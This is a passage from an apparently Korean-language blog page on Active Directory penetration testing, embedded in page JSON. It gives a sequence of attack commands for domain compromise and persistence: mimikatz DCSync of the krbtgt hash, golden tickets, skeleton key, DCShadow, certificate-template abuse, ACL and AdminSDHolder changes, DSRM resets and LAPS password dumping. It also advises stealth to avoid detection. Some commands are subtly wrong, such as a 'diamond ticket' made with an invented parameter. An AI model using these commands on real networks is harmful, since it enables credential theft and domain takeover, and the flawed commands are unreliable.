language-js\"\u003emimikatz.\u003cspan class=\"hljs-property\"\u003eexe\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"lsadump::dcsync /domain:\u0026#x3C;도메인\u003e /user:krbtgt\"\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"exit\"\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003col start=\"2\"\u003e\n\u003cli\u003e도메인 관리자 권한을 얻기 위해 골든 티켓 생성.\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-js\"\u003emimikatz.\u003cspan class=\"hljs-property\"\u003eexe\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"kerberos::golden /user:\u0026#x3C;사용자이름\u003e /domain:\u0026#x3C;도메인\u003e /sid:\u0026#x3C;도메인SID\u003e /krbtgt:\u0026#x3C;krbtgt 해시\u003e /id:\u0026#x3C;사용자ID\u003e /groups:\u0026#x3C;그룹ID들\u003e\"\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"exit\"\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch1\u003e다이아몬드 티켓\u003c/h1\u003e\n\u003cul\u003e\n\u003cli\u003e특별 권한이 있는 다이아몬드 티켓을 만들어보세요.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-js\"\u003emimikatz.\u003cspan class=\"hljs-property\"\u003eexe\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"kerberos::golden /user:\u0026#x3C;username\u003e /domain:\u0026#x3C;domain\u003e /sid:\u0026#x3C;domain_sid\u003e /krbtgt:\u0026#x3C;krbtgt_hash\u003e /id:\u0026#x3C;user_id\u003e /groups:\u0026#x3C;group_ids\u003e /extra:\u0026#x3C;extra_privileges\u003e\"\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"exit\"\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003col start=\"2\"\u003e\n\u003cli\u003e네트워크 내에서 특정 작업에 해당 티켓을 사용하세요.\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch1\u003e인증서 계정 지속성\u003c/h1\u003e\n\u003cul\u003e\n\u003cli\u003e지속성을 유지하기 위해 인증서 템플릿을 남용하지 않도록 주의하세요.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-js\"\u003e\u003cspan class=\"hljs-title class_\"\u003eCertify\u003c/span\u003e.\u003cspan class=\"hljs-property\"\u003eexe\u003c/span\u003e request /\u003cspan class=\"hljs-attr\"\u003eca\u003c/span\u003e:\u0026#x3C;CA Name\u003e /template:\u0026#x3C;Template Name\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003col start=\"2\"\u003e\n\u003cli\u003e인증서를 다시 발급하여 계속된 액세스를 보장하세요.\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-js\"\u003e\u003cspan class=\"hljs-title class_\"\u003eCertify\u003c/span\u003e.\u003cspan class=\"hljs-property\"\u003eexe\u003c/span\u003e renew /\u003cspan class=\"hljs-attr\"\u003eid\u003c/span\u003e:\u0026#x3C;cert_id\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch1\u003e인증서 도메인 지속성\u003c/h1\u003e\n\u003cul\u003e\n\u003cli\u003e도메인 인증서를 수정하여 상위 액세스를 유지하세요.\u003c/li\u003e\n\u003cli\u003e주기적으로 인증서를 갱신하여 지속적인 액세스를 보장하세요.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-js\"\u003e\u003cspan class=\"hljs-title class_\"\u003eCertify\u003c/span\u003e.\u003cspan class=\"hljs-property\"\u003eexe\u003c/span\u003e renew /\u003cspan class=\"hljs-attr\"\u003eid\u003c/span\u003e:\u0026#x3C;cert_id\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch1\u003eAdminSDHolder 그룹\u003c/h1\u003e\n\u003cul\u003e\n\u003cli\u003eAdminSDHolder 그룹 설정을 수정합니다.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-js\"\u003e\u003cspan class=\"hljs-title class_\"\u003eSet\u003c/span\u003e-\u003cspan class=\"hljs-title class_\"\u003eADObject\u003c/span\u003e -\u003cspan class=\"hljs-title class_\"\u003eIdentity\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"CN=AdminSDHolder,CN=System,DC=\u0026#x3C;도메인\u003e,DC=com\"\u003c/span\u003e -\u003cspan class=\"hljs-title class_\"\u003eReplace\u003c/span\u003e @{adminCount=\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e}\n\u003c/code\u003e\u003c/pre\u003e\n\u003col start=\"2\"\u003e\n\u003cli\u003e변경 사항이 전파되도록 상위 권한을 유지합니다.\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-js\"\u003e\u003cspan class=\"hljs-title class_\"\u003eSet\u003c/span\u003e-\u003cspan class=\"hljs-title class_\"\u003eADUser\u003c/span\u003e -\u003cspan class=\"hljs-title class_\"\u003eIdentity\u003c/span\u003e \u0026#x3C;사용자이름\u003e -\u003cspan class=\"hljs-title class_\"\u003eReplace\u003c/span\u003e @{adminCount=\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e}\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch1\u003eDSRM 자격 증명\u003c/h1\u003e\n\u003cul\u003e\n\u003cli\u003e도메인 컨트롤러에서 DSRM 자격 증명을 검색합니다.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-js\"\u003entdsutil \u003cspan class=\"hljs-string\"\u003e\"set dsrm password\"\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"reset password on server \u0026#x3C;서버명\u003e\"\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"quit\"\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003col start=\"2\"\u003e\n\u003cli\u003e이 자격 증명을 사용하여 디렉터리 서비스 복원 모드(Directory Services Restore Mode)에서 DC에 액세스합니다.\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch1\u003eACL 지속성\u003c/h1\u003e\n\u003cul\u003e\n\u003cli\u003e접근을 유지하기 위해 ACL을 수정하세요.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-js\"\u003e\u003cspan class=\"hljs-title class_\"\u003eInvoke\u003c/span\u003e-\u003cspan class=\"hljs-title class_\"\u003eACLpwn\u003c/span\u003e -\u003cspan class=\"hljs-title class_\"\u003eDomain\u003c/span\u003e \u0026#x3C;도메인\u003e -\u003cspan class=\"hljs-title class_\"\u003ePrincipal\u003c/span\u003e \u0026#x3C;사용자\u003e -\u003cspan class=\"hljs-title class_\"\u003eAddFullControl\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003col start=\"2\"\u003e\n\u003cli\u003e변경 내용이 삭제되지 않도록 보호하여 지속성을 보장하세요.\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch1\u003e보안 기술자\u003c/h1\u003e\n\u003cul\u003e\n\u003cli\u003e잘못된 설정을 위한 보안 기술자 분석\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-js\"\u003e\u003cspan class=\"hljs-title class_\"\u003eGet\u003c/span\u003e-\u003cspan class=\"hljs-variable constant_\"\u003eACL\u003c/span\u003e -\u003cspan class=\"hljs-title class_\"\u003ePath\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"AD:\u0026#x3C;경로\u003e\"\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003col start=\"2\"\u003e\n\u003cli\u003e특권 상승을 위해 잘못된 설정을 이용하세요.\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-js\"\u003e\u003cspan class=\"hljs-title class_\"\u003eSet\u003c/span\u003e-\u003cspan class=\"hljs-variable constant_\"\u003eACL\u003c/span\u003e -\u003cspan class=\"hljs-title class_\"\u003ePath\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"AD:\u0026#x3C;경로\u003e\"\u003c/span\u003e -\u003cspan class=\"hljs-title class_\"\u003eACLObject\u003c/span\u003e $acl\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch1\u003e스켈레톤 키\u003c/h1\u003e\n\u003cul\u003e\n\u003cli\u003e도메인 컨트롤러에 스켈레톤 키를 배포합니다.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-js\"\u003emimikatz.\u003cspan class=\"hljs-property\"\u003eexe\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"privilege::debug\"\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"misc::skeleton\"\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"exit\"\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003col start=\"2\"\u003e\n\u003cli\u003e마스터 암호를 사용하여 모든 계정을 인증하세요.\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch1\u003e사용자 정의 SSP\u003c/h1\u003e\n\u003cul\u003e\n\u003cli\u003e사용자 정의 보안 지원 공급자를 설치하세요.\u003c/li\u003e\n\u003cli\u003eSSP를 사용하여 인증 프로세스를 캡처하거나 조작하세요.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch1\u003eDCShadow\u003c/h1\u003e\n\u003cul\u003e\n\u003cli\u003eDCShadow를 사용하여 로그인 DC를 등록하세요.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-js\"\u003emimikatz.\u003cspan class=\"hljs-property\"\u003eexe\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"privilege::debug\"\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"lsadump::dcshadow /push\"\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"exit\"\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003col start=\"2\"\u003e\n\u003cli\u003e수정된 객체 및 권한을 조작하기 위해 AD 데이터베이스에 변경 사항을 푸시하세요.\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-js\"\u003emimikatz.\u003cspan class=\"hljs-property\"\u003eexe\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"privilege::debug\"\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"lsadump::dcshadow /update\"\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"exit\"\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch1\u003eLAPS 지속성\u003c/h1\u003e\n\u003cul\u003e\n\u003cli\u003e액세스를 유지하는 데 LAPS 설정을 활용하세요.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-js\"\u003e\u003cspan class=\"hljs-title class_\"\u003eGet\u003c/span\u003e-\u003cspan class=\"hljs-title class_\"\u003eADComputer\u003c/span\u003e -\u003cspan class=\"hljs-title class_\"\u003eFilter\u003c/span\u003e * -\u003cspan class=\"hljs-title class_\"\u003eProperty\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"ms-MCS-AdmPwd\"\u003c/span\u003e | \u003cspan class=\"hljs-title class_\"\u003eSelect\u003c/span\u003e-\u003cspan class=\"hljs-title class_\"\u003eObject\u003c/span\u003e \u003cspan class=\"hljs-title class_\"\u003eName\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\"ms-MCS-AdmPwd\"\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003col start=\"2\"\u003e\n\u003cli\u003e주기적으로 암호를 업데이트하고 검색하여 지속성을 보장하세요.\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch1\u003eForest Privilege Escalation — Domain Trusts\u003c/h1\u003e\n\u003cul\u003e\n\u003cli\u003e상호도메인 신뢰를 식별합니다.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-js\"\u003e\u003cspan class=\"hljs-title class_\"\u003eGet\u003c/span\u003e-\u003cspan class=\"hljs-title class_\"\u003eADTrust\u003c/span\u003e -\u003cspan class=\"hljs-title class_\"\u003eFilter\u003c/span\u003e *\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e숲 전체에서 권한을 상승시키기 위해 신뢰 관계를 악용하세요.\u003c/p\u003e\n\u003ch1\u003e초보자를 위한 팁\u003c/h1\u003e\n\u003ch1\u003e피해야 할 흔한 실수\u003c/h1\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e정찰 건너뛰기:\u003c/strong\u003e 환경을 이해하기 위해 철저한 정찰이 중요합니다.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e패치 관리 무시하기:\u003c/strong\u003e 환경이 패치로 최신 상태인지 확인하세요.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e권한 상승 경로 간과하기:\u003c/strong\u003e BloodHound와 같은 도구를 사용하여 모든 가능한 경로를 식별하고 악용하세요.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch1\u003e도전과 해결책\u003c/h1\u003e\n\u003cul\u003e\n\u003cli\u003eAD 환경의 복잡성: 환경을 더 작은 세그먼트로 나누어 각각을 철저히 분석하십시오.\u003c/li\u003e\n\u003cli\u003e보안 시스템에 의한 탐지: 탐지를 최소화하는 은밀한 기술과 도구를 사용하십시오.\u003c/li\u003e\n\u003cli\u003e문서화 부족: 과정과 결과를 이해하기 위해 각 단계를 신중하게 문서화하십시오.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eActive Directory 펜테스팅은 AD 구조 및 서비스에 대한 심층적인 이해와 취약점을 식별하고 악용하는 방법론적인 접근이 필요한 복합적인 작업입니다. 이 문서에서 소개된 포괄적인 방법론을 따르면 시스템적으로 취약점을 발견하고 권한을 상승시키며 AD 환경의 보안을 극대화할 수 있습니다. 경험을 쌓으면서 기술을 더욱 정교하게 개선하고 새로운 취약성과 악용 방법을 파악하는 것이 중요합니다. AD 펜테스팅은 결함을 찾는 데 그치는 것이 아니라 IT 인프라의 보안과 유연성에 기여하는 것입니다.\u003c/p\u003e\n\u003cp\u003eActive Directory의 보안을 확보하는 것은 조직의 IT 환경 전반의 안전에 중요합니다. 철저한 펜테스트를 수행하고 식별된 취약점에 대처함으로써 조직은 가치 있는 자산을 보호하고 강력한 보안 자세를 유지할 수 있습니다.\u003c/p\u003e\n\u003cp\u003e📎 커피 한 잔 사주세요\u003c/p\u003e\n\u003c/body\u003e\n\u003c/html\u003e\n"},"__N_SSG":true},"page":"/post/[slug]","query":{"slug":"2024-06-19-ActiveDirectoryMethodologyinPentestingAComprehensiveGuide"},"buildId":"FH3Qr-mLAesqA0X5IFRQr","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>